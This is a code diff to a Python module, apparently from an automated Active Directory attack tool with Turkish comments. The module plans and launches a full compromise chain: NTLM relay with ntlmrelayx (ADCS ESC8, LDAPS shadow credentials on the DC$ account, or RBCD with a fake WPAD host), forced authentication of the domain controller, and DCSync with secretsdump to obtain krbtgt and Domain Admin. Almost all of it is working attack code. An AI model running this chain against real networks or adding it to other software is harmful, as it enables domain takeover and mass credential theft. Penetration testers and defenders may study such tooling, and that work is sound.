@@ -25,7 +25,15 @@ import time
 from .. import config
 from ..findings import Credential, Finding, ScanReport, Severity
 from ..registry import ScanContext, ScanModule
-from ..runner import CommandResult, run, which
+from ..runner import CommandResult, resolve_impacket, run, which
+
+
+def _nrx() -> str:
+    return resolve_impacket("ntlmrelayx.py") or "ntlmrelayx.py"
+
+
+def _secretsdump() -> str:
+    return resolve_impacket("secretsdump.py") or "secretsdump.py"
 from ..util import grep as _grep
 
 # coerce_plus'ın desteklediği zorlama yöntemleri (nxc -M coerce_plus -o METHOD=...)
@@ -93,11 +101,18 @@ def build_plan(ctx: ScanContext) -> list[tuple[str, list[str]]]:
     # 1) Relay dinleyici — ADCS URL verildiyse ESC8, değilse LDAPS (önce başlatılır)
     if ctx.adcs_ca_url:
         plan.append(("ntlmrelayx: ESC8 ADCS web enrollment relay -> makine/DC sertifikası",
-                     ["ntlmrelayx.py", "-t", ca, "-smb2support", "--adcs",
+                     [_nrx(), "-t", ca, "-smb2support", "--adcs",
                       "--template", "DomainController"]))
+    elif not ctx.relay_targets:
+        # Hedef belirtilmediyse DC'nin kendisine LDAPS relay -> shadow credentials:
+        # channel binding=Never'da (bkz. nxc bulgusu) coerced DC$ auth'u ldaps://DC'ye
+        # relay edilir, DC$'a KeyCredential eklenir -> PKINIT -> DC$ hash -> DCSync.
+        plan.append(("ntlmrelayx: SMB/coerce -> LDAPS relay + shadow-credentials (DC$ -> DA)",
+                     ["ntlmrelayx.py", "-t", f"ldaps://{dc}", "--shadow-credentials",
+                      "--shadow-target", "'DC$'", "-smb2support"]))
     else:
         plan.append(("ntlmrelayx: SMB -> LDAPS relay (RBCD/delegasyon)",
-                     ["ntlmrelayx.py", "-6", "-t", targets, "-wh", f"fakewpad.{domain}",
+                     [_nrx(), "-6", "-t", targets, "-wh", f"fakewpad.{domain}",
                       "-l", "loot", "--delegate-access", "-smb2support"]))
 
     # 2) ZORLAMA (coercion): DC'yi dinleyiciye kimlik doğrulamaya zorla (OTOMATİK tetik)
@@ -117,7 +132,7 @@ def build_plan(ctx: ScanContext) -> list[tuple[str, list[str]]]:
 
     # 5) DCSync / secretsdump -> Domain Admin / krbtgt
     plan.append(("secretsdump: DCSync (sertifika/hash ile) -> krbtgt (DA)",
-                 ["secretsdump.py", f"{domain}/'DC$'@{dc}", "-just-dc"]))
+                 [_secretsdump(), f"{domain}/'DC$'@{dc}", "-just-dc"]))
     return plan
 
 
@@ -154,10 +169,14 @@ def _launch_chain(ctx: ScanContext) -> list[CommandResult]:
 
     # Relay hedefi: ADCS URL -> ESC8; değilse LDAPS (RBCD/delegasyon)
     if ctx.adcs_ca_url:
-        relay_argv = ["ntlmrelayx.py", "-t", ctx.adcs_ca_url, "-smb2support",
+        relay_argv = [_nrx(), "-t", ctx.adcs_ca_url, "-smb2support",
                       "--adcs", "--template", "DomainController"]
+    elif not ctx.relay_targets:
+        # DC'ye LDAPS relay + shadow-credentials (channel binding=Never yolu)
+        relay_argv = [_nrx(), "-t", f"ldaps://{dc}", "--shadow-credentials",
+                      "--shadow-target", "DC$", "-smb2support"]
     else:
-        relay_argv = ["ntlmrelayx.py", "-6", "-t", ctx.relay_targets or f"ldaps://{dc}",
+        relay_argv = [_nrx(), "-6", "-t", ctx.relay_targets,
                       "-wh", f"fakewpad.{domain}", "-l", "loot",
                       "--delegate-access", "-smb2support"]
 
